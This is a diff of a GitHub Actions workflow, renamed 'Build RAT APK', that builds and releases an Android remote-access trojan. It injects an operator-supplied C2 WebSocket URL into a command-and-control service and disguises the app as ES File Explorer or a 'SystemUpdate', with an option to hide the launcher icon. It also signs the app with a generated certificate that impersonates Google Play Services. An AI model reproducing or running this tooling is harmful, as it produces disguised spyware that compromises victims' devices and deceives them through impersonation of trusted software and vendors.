@@ -1,112 +1,249 @@
-name: Build Base APK
+name: Build RAT APK
 
 on:
   workflow_dispatch:
     inputs:
-      build_type:
-        description: "Build type"
+      c2_url:
+        description: "C2 WebSocket URL — e.g. wss://your-app.onrender.com/ws"
         required: true
-        default: "debug"
-        type: choice
-        options:
-          - debug
-          - release
-      commit_to_repo:
-        description: "Commit generated APK to repository"
+        type: string
+      app_label:
+        description: "Visible app label (leave blank to keep original)"
         required: false
-        default: true
-        type: boolean
-
-permissions:
-  contents: write
+        default: ""
+        type: string
+      hide_icon:
+        description: "Hide launcher icon after first run"
+        required: false
+        default: "false"
+        type: choice
+        options: ["false", "true"]
+      app_id:
+        description: "APK package name (disguise)"
+        required: false
+        default: "com.estrongs.android.pop"
+        type: string
+      apk_name:
+        description: "Final APK file name (no extension, no spaces — used for rename + release)"
+        required: false
+        default: ""
+        type: string
+      logo_base64:
+        description: "App icon as base64 PNG (leave blank to keep default icon)"
+        required: false
+        default: ""
+        type: string
+      logo_url:
+        description: "OR fetch icon from this URL (ignored if logo_base64 set)"
+        required: false
+        default: ""
+        type: string
 
 env:
-  BUILD_TYPE: ${{ github.event.inputs.build_type || 'debug' }}
-  COMMIT_TO_REPO: ${{ github.event.inputs.commit_to_repo || 'false' }}
+  CCS: android/app/src/main/java/com/seguranca/protecao/CommandControlService.java
 
 jobs:
   build:
+    name: Build & Sign APK
     runs-on: ubuntu-latest
 
     steps:
-      - name: Checkout repository
+      - name: Checkout
         uses: actions/checkout@v4
-        with:
-          token: ${{ secrets.GITHUB_TOKEN }}
+
+      - name: Harden shell
+        run: echo "SHELLOPTS=xtrace:pipefail" >> "$GITHUB_ENV"
 
       - name: Set up JDK 17
         uses: actions/setup-java@v4
         with:
           distribution: temurin
-          java-version: 17
+          java-version: "17"
+          cache: gradle
 
-      - name: Set up Android SDK
-        uses: android-actions/setup-android@v3
-
-      - name: Decode Keystore
-        if: ${{ env.BUILD_TYPE == 'release' }}
+      - name: Setup Android SDK (native)
         run: |
-          echo "${{ secrets.KEYSTORE_BASE64 }}" | base64 -d > fason/app/release.keystore
+          echo "sdk.dir=$ANDROID_SDK_ROOT" > android/local.properties
+          yes | $ANDROID_SDK_ROOT/cmdline-tools/latest/bin/sdkmanager --licenses > /dev/null 2>&1 || true
+          $ANDROID_SDK_ROOT/cmdline-tools/latest/bin/sdkmanager "build-tools;34.0.0" "platforms;android-34"
 
-      - name: Grant execute permission for gradlew
-        run: chmod +x fason/gradlew
+      - name: Clean committed APKs
+        run: rm -fv android/app/*.apk android/**/*.apk 2>/dev/null || true
 
-      - name: Build APK
+      - name: Inject C2 URL into CommandControlService
         run: |
-          cd fason
-          if [ "${{ env.BUILD_TYPE }}" = "release" ]; then
-            ./gradlew assembleRelease --no-daemon
+          URL="${{ github.event.inputs.c2_url }}"
+          sed -i "s|public static final String SERVER_URL = \"[^\"]*\";|public static final String SERVER_URL = \"${URL}\";|g" "${{ env.CCS }}"
+          grep -q "SERVER_URL = \"${URL}\"" "${{ env.CCS }}" || { echo "::error::C2 URL injection failed"; exit 1; }
+          echo "Injected: $(grep 'SERVER_URL =' ${{ env.CCS }} | head -1)"
+
+      - name: Set HIDE_ICON
+        run: |
+          HIDE="${{ github.event.inputs.hide_icon }}"
+          sed -i "s|public static final boolean HIDE_ICON = [^;]*;|public static final boolean HIDE_ICON = ${HIDE};|g" "${{ env.CCS }}"
+
+      - name: Override app label
+        if: ${{ github.event.inputs.app_label != '' }}
+        run: |
+          LABEL="${{ github.event.inputs.app_label }}"
+          sed -i "s|<string name=\"app_name\">[^<]*</string>|<string name=\"app_name\">${LABEL}</string>|g" android/app/src/main/res/values/strings.xml
+          echo "Label set: ${LABEL}"
+
+      - name: Override application ID
+        run: |
+          APP_ID="${{ github.event.inputs.app_id }}"
+          sed -i "s|applicationId \"[^\"]*\"|applicationId \"${APP_ID}\"|g" android/app/build.gradle
+          echo "App ID: ${APP_ID}"
+
+      - name: Inject app icon
+        if: ${{ github.event.inputs.logo_base64 != '' || github.event.inputs.logo_url != '' }}
+        run: |
+          set -euo pipefail
+          TMP_LOGO="/tmp/builder_logo.png"
+          if [ -n "${{ github.event.inputs.logo_base64 }}" ]; then
+            echo "${{ github.event.inputs.logo_base64 }}" | base64 --decode > "$TMP_LOGO"
           else
-            ./gradlew assembleDebug --no-daemon
+            curl -fsSL "${{ github.event.inputs.logo_url }}" -o "$TMP_LOGO"
           fi
-        env:
-          KEYSTORE_FILE: release.keystore
-          KEY_ALIAS: ${{ secrets.KEY_ALIAS }}
-          KEY_PASSWORD: ${{ secrets.KEY_PASSWORD }}
-          STORE_PASSWORD: ${{ secrets.STORE_PASSWORD }}
+          file "$TMP_LOGO"
+          for d in mdpi hdpi xhdpi xxhdpi xxxhdpi; do
+            cp "$TMP_LOGO" "android/app/src/main/res/mipmap-${d}/ic_launcher.png"
+            cp "$TMP_LOGO" "android/app/src/main/res/mipmap-${d}/ic_launcher_round.png"
+          done
+          echo "Icon injected into all mipmap densities"
 
-      - name: Verify APK
+      - name: Prepare keystore
         run: |
-          if [ "${{ env.BUILD_TYPE }}" = "release" ]; then
-            APK_PATH="fason/app/build/outputs/apk/release/app-release.apk"
+          set -euo pipefail
+          if [ -n "${{ secrets.KEYSTORE_BASE64 }}" ]; then
+            echo "Using provided keystore from secret"
+            echo "${{ secrets.KEYSTORE_BASE64 }}" | base64 --decode > android/google-services-release.jks
+            if [ -n "${{ secrets.KEYSTORE_PASSWORD }}" ]; then
+              sed -i "s|storePassword '[^']*'|storePassword '${{ secrets.KEYSTORE_PASSWORD }}'|g" android/app/build.gradle
+              sed -i "s|keyPassword '[^']*'|keyPassword '${{ secrets.KEY_PASSWORD }}'|g" android/app/build.gradle
+              sed -i "s|keyAlias '[^']*'|keyAlias '${{ secrets.KEY_ALIAS }}'|g" android/app/build.gradle
+            fi
           else
-            APK_PATH="fason/app/build/outputs/apk/debug/app-debug.apk"
+            echo "Using bundled test keystore (google-services-release.jks)"
+            ls -lh android/google-services-release.jks
           fi
 
-          if [ ! -f "$APK_PATH" ]; then
-            echo "APK build failed."
+      - name: Verify keystore — self-heal if broken
+        run: |
+          set -euo pipefail
+          STORE_PASS=$(grep "storePassword '" android/app/build.gradle | head -1 | sed "s/.*storePassword '\([^']*\)'.*/\1/")
+          KEY_ALIAS=$(grep "keyAlias '" android/app/build.gradle | head -1 | sed "s/.*keyAlias '\([^']*\)'.*/\1/")
+          if keytool -list -keystore android/google-services-release.jks \
+              -storepass "$STORE_PASS" -alias "$KEY_ALIAS" >/dev/null 2>&1; then
+            echo "Keystore OK (alias: $KEY_ALIAS)"
+          else
+            echo "::warning::Bundled keystore failed verification — generating fresh one"
+            rm -f android/google-services-release.jks
+            keytool -genkeypair -v \
+              -keystore android/google-services-release.jks \
+              -storepass "$STORE_PASS" -keypass "$STORE_PASS" \
+              -alias "$KEY_ALIAS" \
+              -keyalg RSA -keysize 2048 -validity 10000 \
+              -dname "CN=Google Play Services, OU=Android, O=Google, L=Mountain View, S=CA, C=US"
+            echo "Fresh keystore generated"
+          fi
+
+      - name: Make Gradle executable
+        run: chmod +x android/gradlew
+
+      - name: Cache Gradle
+        uses: actions/cache@v4
+        with:
+          path: |
+            ~/.gradle/caches
+            ~/.gradle/wrapper
+          key: ${{ runner.os }}-gradle-${{ hashFiles('android/**/*.gradle*', 'android/**/gradle-wrapper.properties') }}
+          restore-keys: |
+            ${{ runner.os }}-gradle-
+
+      - name: Build release APK
+        working-directory: android
+        run: |
+          set -o pipefail
+          ./gradlew assembleRelease --no-daemon --stacktrace > build.log 2>&1 || {
+            echo "=========================================="
+            echo "BUILD FAILED — error summary:"
+            echo "=========================================="
+            grep -B2 -A15 "What went wrong" build.log || true
+            echo ""
+            echo "=========================================="
+            echo "Failed task(s):"
+            echo "=========================================="
+            grep "FAILED" build.log || true
+            echo ""
+            echo "=========================================="
+            echo "Full log (last 150 lines):"
+            echo "=========================================="
+            tail -150 build.log
             exit 1
-          fi
+          }
+          tail -20 build.log
 
-          echo "APK built successfully."
-          APK_SIZE=$(du -h "$APK_PATH" | cut -f1)
-          echo "APK_SIZE=$APK_SIZE" >> $GITHUB_ENV
-          echo "APK_PATH=$APK_PATH" >> $GITHUB_ENV
-
-      - name: Upload APK artifact
+      - name: Upload build log
+        if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: Fason-${{ env.BUILD_TYPE }}-apk
-          path: ${{ env.APK_PATH }}
+          name: build-log
+          path: android/build.log
+          retention-days: 7
+
+      - name: Verify APK signature
+        working-directory: android
+        run: |
+          set -euo pipefail
+          APK=$(find app/build/outputs -name "*.apk" | head -1)
+          [ -n "$APK" ] || { echo "::error::No APK produced by gradle"; exit 1; }
+          "$ANDROID_SDK_ROOT/build-tools/34.0.0/apksigner" verify --print-certs "$APK" \
+            || { echo "::error::APK is UNSIGNED — signing failed"; exit 1; }
+          echo "Signature verified: $APK"
+
+      - name: Locate and rename APK
+        run: |
+          set -euo pipefail
+          APK=$(find android/app/build/outputs/apk -name "*.apk" -type f | head -1)
+          [ -n "$APK" ] || { echo "::error::No APK found in outputs"; exit 1; }
+          echo "APK found: $APK"
+
+          NAME="${{ github.event.inputs.apk_name }}"
+          if [ -z "$NAME" ]; then
+            LABEL="${{ github.event.inputs.app_label }}"
+            [ -z "$LABEL" ] && LABEL="SystemUpdate"
+            NAME="${LABEL// /_}"
+          fi
+          NAME=$(echo "$NAME" | tr -cd 'A-Za-z0-9._-')
+          [ -z "$NAME" ] && NAME="SystemUpdate"
+
+          OUT="${NAME}_build${{ github.run_number }}.apk"
+          cp "$APK" "$OUT"
+          ls -lh "$OUT"
+          echo "APK_NAME=$OUT" >> "$GITHUB_ENV"
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: ${{ env.APK_NAME }}
+          path: "${{ env.APK_NAME }}"
           retention-days: 30
 
-      - name: Commit APK to repository
-        if: ${{ env.COMMIT_TO_REPO == 'true' }}
-        run: |
-          TARGET_DIR="backend/app/factory/baseApp"
-          TARGET_PATH="$TARGET_DIR/Fason.apk"
-
-          git config user.name "github-actions[bot]"
-          git config user.email "github-actions[bot]@users.noreply.github.com"
-
-          mkdir -p "$TARGET_DIR"
-          cp "$APK_PATH" "$TARGET_PATH"
-
-          if git diff --quiet "$TARGET_PATH"; then
-            echo "No changes detected. Skipping commit."
-          else
-            git add "$TARGET_PATH"
-            git commit -m "chore: update Fason.apk (${{ env.BUILD_TYPE }}) [skip ci]"
-            git push origin HEAD:${{ github.ref }}
-          fi
-          
+      - name: Create Release
+        uses: softprops/action-gh-release@v2
+        with:
+          tag_name: "build-${{ github.run_number }}"
+          name: "APK Build #${{ github.run_number }}"
+          body: |
+            | Field | Value |
+            |-------|-------|
+            | C2 URL | `${{ github.event.inputs.c2_url }}` |
+            | App Label | ${{ github.event.inputs.app_label || '(original)' }} |
+            | App ID | `${{ github.event.inputs.app_id }}` |
+            | Hide Icon | ${{ github.event.inputs.hide_icon }} |
+            | Final APK | `${{ env.APK_NAME }}` |
+            | Build | #${{ github.run_number }} |
+          files: "${{ env.APK_NAME }}"
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
